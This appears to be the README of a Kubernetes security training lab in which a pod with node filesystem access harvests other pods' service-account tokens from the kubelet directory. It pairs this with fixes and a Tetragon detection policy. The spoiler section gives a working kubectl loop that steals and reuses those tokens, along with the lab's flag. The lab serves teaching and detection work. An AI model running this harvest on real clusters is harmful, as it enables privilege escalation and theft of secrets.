# node-token-harvest - stealing service-account tokens off the node

A container-escape *payoff* lab in the nested-cluster shape, and one of three
**attack+detect** labs (`Module.EBPF`, alongside `ebpf-detect` and
`privileged-escape`). The student's foothold has node filesystem access (a
hostPath mount) but a powerless service account. The kubelet writes every pod's
token to the node's disk; the student harvests a powerful one and uses it against
the API to read the flag Secret - then turns to the Defender pane and watches an
in-guest eBPF sensor (Tetragon) catch the token read off the node.

## Shape

Everything is in the module's manifest bundle
(`services/backend/internal/labs/modules/node-token-harvest.yaml`), applied into
the session's disposable nested k3s cluster. All pods use the shared
`k8labs-foothold` image. The flag is bait (see `_template`).

## The flaw

The `workstation` foothold mounts the kubelet directory at
`/host/var/lib/kubelet` (read-only). A separate pod,
`metrics-agent`, runs as `ops/collector` (bound cluster-wide to read secrets), so
the kubelet writes collector's token to disk under
`/var/lib/kubelet/pods/.../token`. The foothold reads that file and presents it
with `kubectl --token`, authenticating as collector - a service-account token is
a bearer credential, tied to no pod. The foothold's own `station` account reads
nothing.

## Containment

Node access here is the disposable nested cluster's node (Kata microVM guest in
prod, runner pod's container under runc locally), so harvested identities exist
only inside the throwaway session.

## Solution (spoiler)

```sh
kubectl auth can-i --list                            # station: nothing useful
kubectl get secret flag -n ops                        # forbidden as yourself
for t in $(find /host/var/lib/kubelet/pods -name token 2>/dev/null); do
  echo "== $t =="; kubectl --token="$(cat "$t")" auth can-i get secrets -n ops
done
# use the token that answered "yes" (collector's):
kubectl --token="$(cat <collector-token-path>)" get secret flag -n ops -o jsonpath='{.data.flag}' | base64 -d
# k8labs{node_access_is_every_pods_token_is_cluster_access}
```

## The fix

Block node access at admission (PodSecurity forbids `hostPath`/`privileged`), and
set `automountServiceAccountToken: false` on workloads that don't call the API,
preferring short-lived audience-bound tokens - so fewer strong tokens are written
to disk. Treat "reached the node" as "reached the cluster" in any assessment.

## What a defender sees

The tell is a pod reading token files that belong to *other* pods, then
authenticating to the API as one of them. This lab makes that observable in-guest:
a Tetragon DaemonSet in the `tetragon` namespace runs a `TracingPolicy`
(`node-token-read`) that hooks the `openat(2)` syscall and posts an event whenever
a process opens a path with prefix `/host/var/lib/kubelet/pods` and suffix
`/token` - the harvest of a kubelet on-disk token through the node mount. The
event stream is tailed into the student's Defender pane (`app=tetragon`, container
`export-stdout`). A syscall hook is used deliberately over the path-resolving LSM
`security_file_permission`, which would report the token's real dentry path and
lose the `/host` node-mount framing. Host eBPF under Kata cannot see inside the
nested cluster, which is exactly why the sensor runs *inside* the session (see
`docs/architecture/ebpf-per-session.md`).

## Verification status

**Verified end-to-end (2026-07-29, local runc/k3d).** A real nested session was
provisioned (session-runner boots k3s, `SESSION_EBPF=1` imports the Tetragon
image), the bundle applied, and the harvest run: Tetragon loaded the policy
cleanly (`Added TracingPolicy with success ... node-token-read`) and the Defender
feed showed the matching `process_kprobe` - `function_name __arm64_sys_openat`,
`policy_name node-token-read`, `string_arg` the token path under
`/host/var/lib/kubelet/pods/.../token`. The exploit itself is also
correct-by-construction (bearer-token reuse via `--token`; the kubelet token path
is the k8s default). The nested "node" is the disposable runner container (runc
locally, Kata microVM in prod), so the harvest is contained to the throwaway
session.
